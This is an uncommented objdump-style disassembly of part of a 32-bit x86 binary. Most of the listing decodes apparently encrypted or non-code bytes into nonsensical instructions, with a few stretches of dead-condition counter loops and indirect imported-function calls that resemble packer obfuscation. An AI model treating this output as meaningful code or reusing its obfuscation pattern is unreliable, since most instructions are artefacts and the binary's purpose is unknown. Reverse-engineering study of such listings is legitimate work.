  41989a:	test   al,0x76
  41989c:	rcl    DWORD PTR [ebp-0x28],0x7c
  4198a0:	push   cs
  4198a1:	adc    al,0xf5
  4198a3:	fcmove st,st(2)
  4198a5:	cdq    
  4198a6:	jmp    esi
  4198a8:	(bad)  
  4198a9:	outs   dx,BYTE PTR ds:[esi]
  4198aa:	out    dx,eax
  4198ab:	xor    eax,0x20e017da
  4198b0:	fcompp 
  4198b2:	inc    ebp
  4198b3:	jno    0x4198a2
  4198b5:	shr    DWORD PTR fs:[bx+di-0x1a],0xf4
  4198bb:	dec    edx
  4198bc:	mov    dl,0x2
  4198be:	lods   eax,DWORD PTR ds:[esi]
  4198bf:	pusha  
  4198c0:	jmp    0x23eb7f40
  4198c5:	or     ebx,esp
  4198c7:	dec    esp
  4198c8:	sbb    BYTE PTR [esi-0x392eb5cf],bl
  4198ce:	pcmpeqb mm0,mm6
  4198d1:	push   cs
  4198d2:	lods   eax,DWORD PTR ds:[esi]
  4198d3:	popf   
  4198d4:	scas   eax,DWORD PTR es:[edi]
  4198d5:	sub    DWORD PTR [eax],esi
  4198d7:	rcr    al,cl
  4198d9:	enter  0x3fb1,0x3b
  4198dd:	fld    DWORD PTR [ebx]
  4198df:	add    al,0xf4
  4198e1:	xchg   ebx,eax
  4198e2:	pusha  
  4198e3:	pop    eax
  4198e4:	inc    ebx
  4198e5:	lahf   
  4198e6:	mov    ecx,0x340506e3
  4198eb:	ja     0x4198ca
  4198ed:	sbb    ebp,DWORD PTR [ebx]
  4198ef:	adc    eax,DWORD PTR [ecx]
  4198f1:	mov    fs,WORD PTR [edi+0x1b807690]
  4198f7:	int    0x16
  4198f9:	dec    esp
  4198fa:	(bad)  
  4198fc:	outs   dx,BYTE PTR ds:[esi]
  4198fd:	push   0x69774e8
  419902:	nop
  419903:	popf   
  419904:	jge    0x419907
  419906:	push   ds
  419907:	pop    ecx
  419908:	inc    ecx
  419909:	dec    edx
  41990a:	fldenv [ecx-0x41]
  41990d:	cmp    dl,ah
  41990f:	push   es
  419910:	sub    DWORD PTR [edi],edi
  419912:	enter  0xc56a,0xb9
  419916:	int3   
  419917:	(bad)  
  419918:	mov    edx,0xde859bbc
  41991d:	pop    ds
  41991e:	jno    0x4198f6
  419920:	nop
  419921:	mov    dl,0x9f
  419923:	jecxz  0x4198d4
  419925:	mov    DWORD PTR [edx],edx
  419927:	mov    ebp,DWORD PTR [ebx-0x2e0f0e9d]
  41992d:	arpl   WORD PTR [edx+esi*8+0x6a8e2a43],bx
  419934:	shl    BYTE PTR [ebx],0x5
  419937:	inc    ebp
  419938:	test   bl,dl
  41993a:	in     al,dx
  41993b:	lods   al,BYTE PTR ds:[esi]
  41993c:	scas   eax,DWORD PTR es:[edi]
  41993d:	int    0x2b
  41993f:	or     ebp,DWORD PTR [eax-0x3d]
  419942:	pop    ebp
  419943:	pop    ecx
  419944:	xor    DWORD PTR [edx+0x7a263e2b],edx
  41994a:	cmc    
  41994b:	(bad)  
  41994d:	jp     0x4199c2
  41994f:	dec    edi
  419950:	scas   eax,DWORD PTR es:[edi]
  419951:	or     dh,BYTE PTR [ebp+0x43a00fdb]
  419957:	scas   eax,DWORD PTR es:[edi]
  419958:	sub    BYTE PTR [ecx+ebx*4],ah
  41995b:	pop    edx
  41995c:	(bad)  
  41995e:	push   ds
  41995f:	stc    
  419960:	imul   esp,DWORD PTR [esi+0x642afcf8],0x26bb9d7c
  41996a:	add    eax,0x48a3adc7
  41996f:	mov    dl,0xe9
  419971:	jns    0x419912
  419973:	shl    DWORD PTR [edx],0x25
  419976:	push   ebx
  419977:	cmp    al,0x1b
  419979:	or     dl,ah
  41997b:	cmp    dh,BYTE PTR [eax+0x5edd9049]
  419981:	sahf   
  419982:	xchg   edx,eax
  419983:	stc    
  419984:	jnp    0x419971
  419986:	cs mov al,0x7f
  419989:	cli    
  41998a:	push   ds
  41998b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41998c:	cmp    BYTE PTR [esi-0x53],dl
  41998f:	dec    esp
  419991:	popa   
  419992:	push   ss
  419993:	arpl   WORD PTR [edx-0x71b53715],di
  419999:	and    BYTE PTR ds:0x35672127,al
  41999f:	push   ebp
  4199a0:	test   BYTE PTR [edi],cl
  4199a2:	je     0x41992a
  4199a4:	xor    DWORD PTR es:0xc909607a,eax
  4199ab:	push   esi
  4199ac:	pop    esi
  4199ad:	inc    ebx
  4199ae:	hlt    
  4199af:	push   edi
  4199b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4199b1:	pop    es
  4199b2:	stc    
  4199b3:	sub    eax,0x5c45a908
  4199b8:	jle    0x419a18
  4199ba:	ror    BYTE PTR [esi+0x30],1
  4199bd:	cli    
  4199be:	pop    esp
  4199bf:	sub    edx,edi
  4199c1:	adc    ecx,0x1fe4
  4199c7:	xor    esi,esi
  4199c9:	xor    DWORD PTR ds:0x42a82d,0x2675
  4199d3:	mov    DWORD PTR [ebp-0x28],esi
  4199d6:	mov    DWORD PTR ds:0x42a8a1,0x12
  4199e0:	cmp    DWORD PTR ds:0x42a8a1,0x0
  4199e7:	je     0x419a88
  4199ed:	cmp    DWORD PTR ds:0x42a8a1,0x16
  4199f4:	jne    0x419a15
  4199fa:	push   0x8ec2
  4199ff:	push   DWORD PTR [ebp-0x24]
  419a02:	push   0x4fb2
  419a07:	push   0x17f0
  419a0c:	push   DWORD PTR [ebp-0x20]
  419a0f:	call   DWORD PTR ds:0x41d11c
  419a15:	mov    ecx,DWORD PTR ds:0x42a8a1
  419a1b:	dec    ecx
  419a1c:	mov    DWORD PTR ds:0x42a8a1,ecx
  419a22:	jmp    0x4199e0
  419a27:	mov    DWORD PTR ds:0x42a785,0x1b
  419a31:	cmp    DWORD PTR ds:0x42a785,0x0
  419a38:	je     0x419a88
  419a3e:	cmp    DWORD PTR ds:0x42a785,0x5
  419a45:	jne    0x419a54
  419a4b:	push   DWORD PTR [ebp-0x14]
  419a4e:	call   DWORD PTR ds:0x41d1fc
  419a54:	cmp    DWORD PTR ds:0x42a785,0x6
  419a5b:	jne    0x419a6e
  419a61:	mov    ecx,DWORD PTR ds:0x42a785
  419a67:	dec    ecx
  419a68:	mov    DWORD PTR ds:0x42a785,ecx
  419a6e:	xor    ecx,ecx
  419a70:	or     ecx,DWORD PTR ds:0x42a785
  419a76:	dec    ecx
  419a77:	mov    DWORD PTR ds:0x42a785,ecx
  419a7d:	jmp    0x419a31
  419a82:	adc    DWORD PTR ds:0x42a825,ebx
  419a88:	mov    DWORD PTR [ebp-0x2c],esi
  419a8b:	and    DWORD PTR ds:0x42a869,ecx
  419a91:	mov    DWORD PTR [ebp-0x14],esi
  419a94:	add    ecx,DWORD PTR ds:0x42a7d5
  419a9a:	mov    DWORD PTR [ebp-0x8],esi
  419a9d:	mov    ecx,DWORD PTR [ebp-0x18]
  419aa0:	adc    DWORD PTR ds:0x42a85d,0x42a7d1
  419aaa:	xor    ecx,eax
  419aac:	xor    edi,edi
  419aae:	and    DWORD PTR ds:0x42a8a1,0x0
  419ab8:	jmp    0x419ac8
  419abd:	mov    eax,ds:0x42a8a1
  419ac2:	inc    eax
  419ac3:	mov    ds:0x42a8a1,eax
  419ac8:	cmp    DWORD PTR ds:0x42a8a1,0x1c
  419acf:	jae    0x419af8
  419ad5:	cmp    DWORD PTR ds:0x42a8a1,0x1e
  419adc:	jne    0x419aed
  419ae2:	push   0x42a825
  419ae7:	call   DWORD PTR ds:0x41d120
  419aed:	jmp    0x419abd
  419af2:	adc    eax,DWORD PTR ds:0x42a7ed
  419af8:	add    ecx,ebx
  419afa:	mov    DWORD PTR [ebp-0x20],ecx
  419afd:	mov    eax,ds:0x42a865
  419b02:	jmp    0x419d37
  419b07:	cmp    eax,0xcbcec3c5
  419b0c:	fcmovbe st,st(1)
  419b0e:	aad    0x68
  419b10:	xor    DWORD PTR [ecx+0xd],0xffffff8c
  419b14:	xchg   ecx,eax
  419b15:	cs icebp 
  419b17:	ror    bh,1
  419b19:	jg     0x419b93
  419b1b:	adc    BYTE PTR [esi+0x78],bh
  419b1e:	js     0x419b70
  419b20:	dec    esp
  419b21:	dec    esp
  419b22:	mov    BYTE PTR [ebp-0x3adf4961],ch
  419b28:	add    ah,BYTE PTR [ecx-0x1d]
  419b2b:	mov    esi,0x6a556805
  419b30:	(bad)  
  419b31:	ins    BYTE PTR es:[edi],dx
  419b32:	pushf  
  419b33:	and    DWORD PTR [esi-0x25],ebx
  419b36:	mov    eax,0x9183b85d
  419b3b:	jno    0x419b7e
  419b3d:	cmp    DWORD PTR [edi-0x6ba43368],esi
  419b43:	inc    esp
  419b44:	sbb    cl,BYTE PTR [eax]
  419b46:	sbb    BYTE PTR [ecx-0x43b4aa00],bl
  419b4c:	adc    ebx,DWORD PTR [edi-0x498d704e]
  419b52:	(bad)  
  419b53:	enter  0x3d69,0xbc
  419b57:	jb     0x419b8c
  419b59:	dec    edi
  419b5a:	loopne 0x419b52
  419b5c:	mov    ch,0x93
  419b5e:	ss int3 
  419b60:	xor    ebx,eax
  419b62:	adc    al,0x4a
  419b64:	das    
  419b65:	sbb    DWORD PTR [ebp-0x50],esp
  419b68:	cwde   
  419b69:	push   ecx
  419b6a:	std    
  419b6b:	lock sbb al,0xc8
  419b6e:	xor    DWORD PTR [edi-0x29800a6d],ebx
  419b74:	data16 and BYTE PTR [ebx+0x4626fdf3],dl
  419b7b:	ss xor al,0xc0
  419b7e:	les    ecx,FWORD PTR ds:0x4cb76986
  419b84:	ret    0xc632
  419b87:	jl     0x419bf9
  419b89:	(bad)
  419b8c:	sub    eax,edi
  419b8e:	xchg   edi,eax
  419b8f:	test   eax,0xf26c1599
  419b94:	ficom  DWORD PTR [ecx+0x4caea062]
  419b9a:	pop    ss
  419b9b:	jmp    0xcd24c473
  419ba0:	rcl    ebx,1
  419ba2:	imul   DWORD PTR [ebx-0x79]
  419ba5:	xchg   BYTE PTR [ebx-0x4c],bh
  419ba8:	fdivr  QWORD PTR [ebp+eiz*1-0x26]
  419bac:	bound  esp,QWORD PTR [ebx+0x6f]
  419baf:	mov    DWORD PTR [ebx],0xdab8b4e7
  419bb5:	mov    bl,0xed
  419bb7:	pop    edi
  419bb8:	mov    esi,0xe26091e9
  419bbd:	or     ch,dl
  419bbf:	cwde   
  419bc0:	outs   dx,BYTE PTR ds:[esi]
  419bc1:	or     eax,0xbeb62989
  419bc6:	ret    
  419bc7:	dec    edi
  419bc8:	retf   0x9e33
  419bcb:	fiadd  WORD PTR [edx+0x58]
  419bce:	pop    edi
  419bcf:	ret    0xe50a
  419bd2:	rcr    BYTE PTR [ecx],cl
  419bd4:	(bad)  
  419bd5:	push   eax
  419bd6:	dec    esi
  419bd7:	stos   DWORD PTR es:[edi],eax
  419bd8:	(bad)  
  419bd9:	mov    ds:0x60da9e8,al
  419bde:	scas   eax,DWORD PTR es:[edi]
  419bdf:	(bad)  
  419be0:	and    esi,DWORD PTR [eax-0x41]
  419be3:	pop    ds
  419be4:	add    esp,DWORD PTR [edx]
  419be6:	mul    DWORD PTR [edi+0x35]
  419be9:	daa    
  419bea:	pop    ss
  419beb:	inc    eax
  419bec:	and    esi,DWORD PTR [edx]
  419bee:	iret   
  419bef:	sahf   
  419bf0:	xor    esp,DWORD PTR [eax+0x3c]
  419bf3:	out    0x6b,al
  419bf5:	jmp    0xeca6:0x2c3617a8
  419bfc:	popf   
  419bfd:	loop   0x419bcb
  419bff:	mov    ch,0x3c
  419c01:	test   dh,dl
  419c03:	add    dl,bh
  419c05:	xor    BYTE PTR [ebx+0x510950b4],al
  419c0b:	inc    esp
  419c0c:	mov    edi,0xfc9d3c67
  419c11:	dec    ebx
  419c12:	lods   al,BYTE PTR ds:[esi]
  419c13:	inc    ebx
  419c14:	(bad)  
  419c15:	inc    al
  419c17:	sbb    BYTE PTR [edi+0x2290be2b],bl
  419c1d:	out    dx,eax
  419c1e:	std    
  419c1f:	imul   di,WORD PTR [eax+edi*4-0x6f558cbc],0xffd3
  419c28:	push   ds
  419c29:	jns    0x419c83
  419c2b:	sar    edi,1
  419c2d:	sahf   
  419c2e:	imul   ebp,DWORD PTR [esi+0x2],0xcec98d34
  419c35:	or     eax,0xfbcebf48
  419c3a:	sub    eax,0x74758c43
  419c3f:	clc    
  419c40:	retf   
  419c41:	push   esi
  419c42:	pop    ecx
  419c43:	dec    esi
  419c44:	or     BYTE PTR [ebp-0x4d],bh
  419c47:	aaa    
  419c48:	push   ebx
  419c49:	pop    edi
  419c4a:	stos   BYTE PTR es:[edi],al
  419c4b:	jbe    0x419c8b
  419c4d:	mov    esp,0xe498681d
  419c52:	xor    BYTE PTR [ebp+0x69],0x8
  419c56:	addr16 push esi
  419c58:	cmc    
  419c59:	(bad)  
  419c5b:	jp     0x419cbb
  419c5d:	adc    ah,BYTE PTR [eax+0x3f5aa9c2]
  419c63:	test   DWORD PTR [ebp+0x9],ebx
  419c66:	sbb    dl,BYTE PTR ds:0x1b618b2b
  419c6c:	and    edi,ebp
  419c6e:	ror    BYTE PTR [esi+0x51],0xdc
  419c72:	jo     0x419ca8
  419c74:	add    eax,0xb82cbdf4
  419c79:	pop    es
  419c7a:	jmp    0x374c624b
  419c7f:	imul   esp,DWORD PTR [ecx-0x3296a943],0xa552ff2e
  419c89:	les    edi,FWORD PTR [esi+ecx*4+0x2ae81ccd]
  419c90:	in     al,0xa5
  419c92:	add    eax,0x47d4e2a7
  419c97:	ret    0x3376
  419c9a:	mov    esp,DWORD PTR [esi-0x17]
  419c9d:	popa   
  419c9e:	xchg   ecx,eax
  419c9f:	xor    ecx,DWORD PTR [esi]
  419ca1:	cwde   
  419ca2:	es dec edx
  419ca4:	mov    gs,WORD PTR [ebx+0x75]
  419ca7:	cmp    eax,eax
  419ca9:	adc    dh,BYTE PTR [ebx]
  419cab:	mov    cl,0x46
  419cad:	jae    0x419ce4
  419caf:	pop    ss
  419cb0:	xchg   BYTE PTR [edi+0x37efd85],al
  419cb6:	out    0x80,eax
  419cb8:	jmp    0xab8a5d45
  419cbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419cbe:	pop    esi
  419cbf:	or     esi,DWORD PTR [ebp+0xe878e66]
  419cc5:	xchg   BYTE PTR [esi+0x15],al
  419cc8:	gs jmp 0x1887:0x7095d492
  419cd0:	setb   BYTE PTR [edi-0x5c397d6b]
  419cd7:	jbe    0x419c7b
  419cd9:	rol    DWORD PTR [edx+0x16],0x4b
  419cdd:	test   BYTE PTR [eax+0x1e],bl
  419ce0:	xchg   esi,eax
  419ce1:	xlat   BYTE PTR ds:[ebx]
  419ce2:	or     al,0x34
  419ce4:	push   ebp
  419ce5:	test   dl,dl
  419ce7:	sbb    al,0xb8
  419ce9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419cea:	push   0xfffffff9
  419cec:	xchg   esp,eax
  419ced:	sub    eax,0x81d55d07
  419cf2:	lds    esp,FWORD PTR [edx-0x7a411934]
  419cf8:	pop    es
  419cf9:	sub    BYTE PTR [esp+eiz*2],bh
  419cfc:	xchg   ecx,eax
  419cfd:	adc    ah,BYTE PTR [ecx+0x59]
  419d00:	cmp    dl,BYTE PTR [ecx-0x3b]
  419d03:	sbb    BYTE PTR [ecx+0x71d102ab],bl
  419d09:	adc    al,0x94
  419d0b:	dec    esp
  419d0c:	mov    dl,cl
  419d0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d0f:	push   edi
  419d10:	mov    ch,0x72
  419d12:	test   DWORD PTR [edi],edi
  419d14:	sub    DWORD PTR [ebx+ecx*8+0xfb96ce9],edi
  419d1b:	(bad)  
  419d1c:	aam    0x79
  419d1e:	fmulp  st(0),st
  419d20:	dec    edx
  419d21:	scas   al,BYTE PTR es:[edi]
  419d22:	pop    ebx
  419d23:	push   ecx
  419d24:	sub    DWORD PTR [ebp-0x2a],edi
  419d27:	sbb    al,0xaf
  419d29:	or     cl,dl
  419d2b:	stc    
  419d2c:	retf   0xbe31
  419d2f:	aad    0xd6
  419d31:	xor    edx,DWORD PTR [ebx+0x79]
  419d34:	ficom  DWORD PTR [ecx-0x1fba7499]
  419d3a:	je     0x41a8c9
  419d40:	inc    eax
  419d41:	mov    eax,DWORD PTR [ebp-0x4]
  419d44:	xor    eax,0x7510850
  419d49:	sbb    DWORD PTR ds:0x42a859,0x42a78d
  419d53:	add    eax,ebx
  419d55:	mov    DWORD PTR ds:0x42a8a9,0x7077
  419d5f:	cmp    edi,eax
  419d61:	mov    DWORD PTR ds:0x42a85d,0xab2
  419d6b:	jmp    0x419fa0
  419d70:	(bad)  
  419d71:	into   
  419d72:	ror    bh,cl
  419d74:	(bad)  
  419d76:	leave  
  419d77:	(bad)  
  419d78:	push   0xffffffe9
  419d7a:	or     esi,esi
  419d7c:	jbe    0x419d32
  419d7e:	jno    0x419d66
  419d80:	call   0x10ba1d52
  419d85:	jle    0x419dff
  419d87:	js     0x419d98
  419d89:	lea    esp,[edx-0x7790a4bd]
  419d8f:	pop    edx
  419d90:	ret    0xb0e
  419d93:	sbb    bh,dl
  419d95:	mov    WORD PTR [ebx],fs
  419d97:	das    
  419d98:	jb     0x419db9
  419d9a:	cmp    DWORD PTR [ebp+0x3cfec098],esp
  419da0:	jmp    0x419e19
  419da2:	inc    esp
  419da3:	(bad)  
  419da4:	out    dx,al
  419da5:	out    0xd9,al
  419da7:	loopne 0x419d79
  419da9:	mov    ebx,0x585b45a4
  419dae:	sub    ah,BYTE PTR [esi]
  419db0:	xchg   edi,eax
  419db1:	nop
  419db2:	adc    BYTE PTR [edi],0xc9
  419db5:	and    eax,0x15bab366
  419dba:	in     eax,dx
  419dbb:	xchg   ecx,eax
  419dbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419dbd:	ins    BYTE PTR es:[edi],dx
  419dbe:	out    dx,al
  419dbf:	jae    0x419da5
  419dc1:	mov    ah,0x6f
  419dc3:	mov    dl,cl
  419dc5:	test   al,0xa4
  419dc7:	mov    bl,0xb2
  419dc9:	enter  0x3234,0xb3
  419dcd:	lock and BYTE PTR [ebp-0x4589b9ee],0x4d
  419dd5:	cmp    dh,BYTE PTR ds:0x6aec3b5d
  419ddb:	icebp  
  419ddc:	push   ebx
  419ddd:	ret    0x35ec
  419de0:	hlt    
  419de1:	adc    bl,cl
  419de3:	and    bh,BYTE PTR [eax+0x48]
  419de6:	jne    0x419deb
  419de8:	mov    eax,ds:0x71466ba5
  419ded:	mov    ecx,gs
  419def:	jae    0x419e05
  419df1:	cmp    eax,0x50cf74e4
  419df6:	rol    BYTE PTR [ebp-0x6d139ece],1
  419dfc:	stos   BYTE PTR es:[edi],al
  419dfd:	xchg   edx,eax
  419dfe:	(bad)  
  419dff:	scas   eax,DWORD PTR es:[edi]
  419e00:	popf   
  419e01:	ds (bad) 
  419e03:	in     al,dx
  419e04:	fst    QWORD PTR [ebp+0x206c8d20]
  419e0a:	mov    ebx,0xc159f294
  419e0f:	jmp    0x419e10
  419e11:	lea    ebp,[ebx]
  419e13:	mov    esi,0x550f68f9
  419e18:	push   ds
  419e19:	ja     0x419e11
  419e1b:	add    ebp,edx
  419e1d:	push   edi
  419e1e:	mov    ecx,0x68ff507c
  419e23:	sar    BYTE PTR [ecx-0x3f],cl
  419e26:	rcr    BYTE PTR [edx-0x6e],1
  419e29:	mov    ds:0x8c0a1481,eax
  419e2e:	fadd   DWORD PTR [edi]
  419e30:	xor    dh,BYTE PTR [esp+edx*2]
  419e33:	sbb    al,0x82
  419e35:	xlat   BYTE PTR ss:[ebx]
  419e37:	add    cl,BYTE PTR [ebp+0x79]
  419e3a:	loopne 0x419e81
  419e3c:	pop    ss
  419e3d:	push   cs
  419e3e:	sub    BYTE PTR [edi-0x5c54eeb],bl
  419e44:	sub    ebp,DWORD PTR [edx+0x1068b57a]
  419e4a:	popa   
  419e4b:	mov    esp,0xa134db82
  419e50:	push   edi
  419e51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e52:	lea    edx,[eax+0x4bcd90e3]
  419e58:	mov    ds:0x30088eb8,eax
  419e5d:	cmp    eax,0xf716c02d
  419e62:	push   ds
  419e63:	lea    esi,[ebx+0x43]
  419e66:	lods   al,BYTE PTR ds:[esi]
  419e67:	pop    esi
  419e68:	pop    edx
  419e69:	in     al,dx
  419e6a:	jg     0x419e19
  419e6c:	inc    eax
  419e6d:	xchg   DWORD PTR [ebx+0x616c9ee],esi
  419e73:	xchg   ecx,eax
  419e74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e75:	cmc    
  419e76:	inc    esi
  419e77:	pushf  
  419e78:	mov    esp,0x8b0a5b2c
  419e7d:	push   eax
  419e7e:	call   0x3d16:0x8a8fea47
  419e85:	or     al,0x14
  419e87:	test   BYTE PTR [ebx],bl
  419e89:	pop    eax
  419e8a:	add    dl,BYTE PTR [esi]
  419e8c:	call   0x637f:0x91108644
  419e93:	mov    dl,0xe6
  419e95:	xchg   edi,eax
  419e96:	sar    DWORD PTR [eax-0x7d8a1871],cl
  419e9c:	popa   
  419e9d:	test   BYTE PTR [ebx-0x19],bl
  419ea0:	xchg   ebp,eax
  419ea1:	jge    0x419e57
  419ea3:	mov    ah,bh
  419ea5:	jg     0x419f14
  419ea7:	stos   DWORD PTR es:[edi],eax
  419ea8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ea9:	mov    ah,0xec
  419eab:	add    BYTE PTR [edi],dh
  419ead:	inc    esp
  419eae:	js     0x419f27
  419eb0:	clc    
  419eb1:	jl     0x419e4b
  419eb3:	adc    BYTE PTR [ebx-0x5a],0xb8
  419eb7:	jno    0x419f22
  419eb9:	mov    ss,ecx
  419ebb:	mov    BYTE PTR [edi+0x7742b1f9],ch
  419ec1:	adc    eax,DWORD PTR [esi-0x6a0f288f]
  419ec7:	outs   dx,DWORD PTR ds:[esi]
  419ec8:	nop
  419ec9:	loop   0x419e5d
  419ecb:	sbb    eax,0xab23b424
  419ed0:	sbb    esi,DWORD PTR [edi-0x5391efa8]
  419ed6:	cmp    al,0x42
  419ed8:	in     eax,0x7f
  419eda:	and    cl,dl
  419edc:	fst    st(2)
  419ede:	add    esp,DWORD PTR [ecx]
  419ee0:	sbb    BYTE PTR [edi-0xa],bh
  419ee3:	ss mov al,bh
  419ee6:	jno    0x419f2c
  419ee8:	ds mov ch,0x9a
  419eeb:	or     BYTE PTR [ebp-0x6bf1260c],cl
  419ef1:	pop    ss
  419ef2:	sahf   
  419ef3:	aam    0xf9
  419ef5:	sub    edx,DWORD PTR [ebp+edi*1+0x2a]
  419ef9:	ret    
  419efa:	xchg   edi,eax
  419efb:	or     edx,ebx
  419efd:	adc    BYTE PTR [edi],cl
  419eff:	jl     0x419f66
  419f01:	test   DWORD PTR [esp+edi*4],ebx
  419f04:	adc    al,0xf0
  419f06:	xor    edx,DWORD PTR ds:0xc4ddcd0d
  419f0c:	pop    edi
  419f0e:	cmp    eax,0x71288e9b
  419f13:	cmc    
  419f14:	jo     0x419f71
  419f16:	ja     0x419f0f
  419f18:	xchg   esp,eax
  419f19:	cmp    ah,bl
  419f1b:	call   0xe1d0356b
  419f20:	dec    ebx
  419f21:	cmp    BYTE PTR ds:0x64fa68bf,cl
  419f27:	imul   edi,DWORD PTR [edx-0x36],0xffffffa8
  419f2b:	(bad)  
  419f2c:	lock pop ebp
  419f2e:	mov    edi,0xe12327e7
  419f33:	data16 xor BYTE PTR [ecx+0x71913355],cl
  419f3a:	push   ebp
  419f3b:	stos   BYTE PTR es:[edi],al
  419f3c:	int    0x5b
  419f3e:	pop    ss
  419f3f:	xchg   ebp,eax
  419f40:	div    DWORD PTR [ebx+0x60f9f489]
  419f46:	push   edi
  419f47:	dec    esp
  419f48:	imul   esp
  419f4a:	scas   eax,DWORD PTR es:[edi]
  419f4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f4c:	stos   DWORD PTR es:[edi],eax
  419f4d:	jae    0x419f47
  419f4f:	scas   al,BYTE PTR es:[edi]
  419f50:	lods   eax,DWORD PTR ss:[esi]
  419f52:	add    BYTE PTR [ebp+0x5e],al
  419f55:	sar    DWORD PTR [eax],0x8f
  419f58:	pusha  
  419f59:	cmp    DWORD PTR [ebp+esi*2+0x5475401b],ecx
  419f60:	leave  
  419f61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f62:	imul   esp,DWORD PTR [ecx],0x11
  419f65:	mov    eax,ds:0x78311d82
  419f6a:	adc    DWORD PTR [edi],ebx
  419f6c:	xor    al,0x14
  419f6e:	ss push ebx
  419f70:	add    ah,dh
  419f72:	xchg   esp,eax
  419f73:	add    DWORD PTR [esi-0x2535127f],edi
  419f79:	and    dh,BYTE PTR [edx-0x35]
  419f7c:	inc    edi
  419f7d:	jno    0x419ff0
  419f7f:	pop    eax
  419f80:	and    DWORD PTR [edi+0xa],ebp
  419f83:	mov    esi,0x4c9d820d
  419f88:	loope  0x419f44
  419f8a:	dec    esi
  419f8b:	leave  
  419f8c:	jl     0x419ffb
  419f8e:	sub    BYTE PTR [ecx+0x4c],bh
  419f91:	add    eax,0x2732f025
  419f96:	dec    ebx
  419f97:	push   0x39dccf74
  419f9c:	test   eax,0xffd8f11
  419fa1:	test   DWORD PTR [ecx-0x7efffffa],edx
  419fa7:	add    eax,0x42a7e5
  419fac:	and    DWORD PTR [edi+0x75ff0042],0x910d8108
  419fb6:	test   al,0x42
  419fb8:	add    dl,al
  419fba:	dec    eax
  419fbb:	add    BYTE PTR [eax],al
  419fbd:	call   0x4175e1
  419fc2:	and    DWORD PTR ds:0x42a855,edi
  419fc8:	mov    DWORD PTR [ebp-0x20],eax
  419fcb:	jmp    0x41a200
  419fd0:	aas    
  419fd1:	into   
  419fd2:	leave  
  419fd3:	int    0xd9
  419fd5:	(bad)  
  419fd7:	into   
  419fd8:	fwait
  419fd9:	or     BYTE PTR [eax-0x74],0x53
  419fdd:	pop    esp
  419fde:	loope  0x419fa7
  419fe0:	adc    bl,0x7f
  419fe3:	js     0x419ff5
  419fe5:	jle    0x41a05f
  419fe7:	js     0x41a056
  419fe9:	cwde   
  419fea:	pop    esp
  419fec:	inc    ebp
  419fed:	xor    eax,0x526fb3cd
  419ff2:	hlt    
  419ff3:	pop    esi
  419ff4:	je     0x419f9f
  419ff6:	(bad)
  419ff9:	int    0x6d
  419ffb:	popf   
  419ffc:	pop    ebx
  419ffd:	test   al,0x96
  419fff:	cld    
  41a000:	iret   
  41a001:	xor    cl,BYTE PTR [ebx+0x29]
  41a004:	push   eax
  41a005:	mov    edx,0x49676729
  41a00a:	mov    eax,0xb148ceb8
  41a00f:	repz inc edi
  41a011:	sti    
  41a012:	push   eax
  41a013:	(bad)  [ebp+0x57587c1e]
  41a019:	push   ecx
  41a01a:	jp     0x419fe3
  41a01c:	push   ss
  41a01d:	or     eax,0xf7f364dd
  41a022:	das    
  41a023:	and    al,0xdd
  41a025:	add    eax,0xd88d4ad1
  41a02a:	test   al,0x36
  41a02c:	push   ds
  41a02d:	out    dx,eax
  41a02e:	test   al,0x87
  41a030:	push   ds
  41a031:	dec    eax
  41a032:	mov    BYTE PTR [ebx],al
  41a034:	mov    ss,ebx
  41a036:	add    ecx,edx
  41a038:	xchg   ebx,eax
  41a039:	clc    
  41a03a:	cmc    
  41a03b:	mov    fs,WORD PTR [eax-0x1b]
  41a03e:	aaa    
  41a03f:	dec    edi
  41a040:	daa    
  41a041:	push   ebx
  41a042:	ret    0x6970
  41a045:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a046:	aad    0x4a
  41a048:	and    BYTE PTR [ebp+0x51c1c545],0x2b
  41a04f:	(bad)  
  41a051:	scas   al,BYTE PTR es:[edi]
  41a052:	mov    BYTE PTR [ecx+0x6e],ch
  41a055:	and    al,0xa8
  41a057:	int3   
  41a058:	inc    ecx
  41a059:	int    0xf6
  41a05b:	dec    ebx
  41a05c:	mov    dh,0x9f
  41a05e:	lods   al,BYTE PTR ds:[esi]
  41a05f:	js     0x41a05a
  41a061:	icebp  
  41a062:	jecxz  0x41a0d6
  41a064:	shl    edi,1
  41a066:	call   DWORD PTR [bp+0x54]
  41a06a:	and    DWORD PTR [edi+eax*8],ebp
  41a06d:	outs   dx,DWORD PTR ds:[esi]
  41a06e:	icebp  
  41a06f:	mov    edx,0x166e9967
  41a074:	ss push ds
  41a076:	aad    0x90
  41a078:	(bad)  
  41a079:	dec    esi
  41a07a:	int3   
  41a07b:	shr    BYTE PTR [ecx],0x32
  41a07e:	enter  0x33d3,0x7a
  41a082:	pop    ebx
  41a083:	stos   BYTE PTR es:[edi],al
  41a084:	dec    DWORD PTR [ecx-0x32f0ded7]
  41a08a:	and    al,BYTE PTR [ebx]
  41a08c:	fstp   TBYTE PTR [ebp-0x68]
  41a08f:	(bad)  
  41a091:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a092:	xor    ah,BYTE PTR [esi+0x1142f733]
  41a098:	dec    esi
  41a099:	jp     0x41a0e2
  41a09b:	ror    DWORD PTR ds:0x2caf99fa,1
  41a0a1:	pop    eax
  41a0a2:	(bad)  
  41a0a3:	enter  0x26a9,0x9f
  41a0a7:	lods   al,BYTE PTR ds:[esi]
  41a0a8:	iret   
  41a0a9:	mov    bl,0x8b
  41a0ab:	out    0xd6,eax
  41a0ad:	jp     0x41a0e7
  41a0af:	ins    BYTE PTR es:[edi],dx
  41a0b0:	push   es
  41a0b1:	dec    edx
  41a0b2:	ja     0x41a04d
  41a0b4:	jno    0x41a044
  41a0b6:	mov    WORD PTR [ecx+0x7c42305f],cs
  41a0bc:	xchg   ecx,eax
  41a0bd:	xchg   BYTE PTR [edx+0x658dd14b],ah
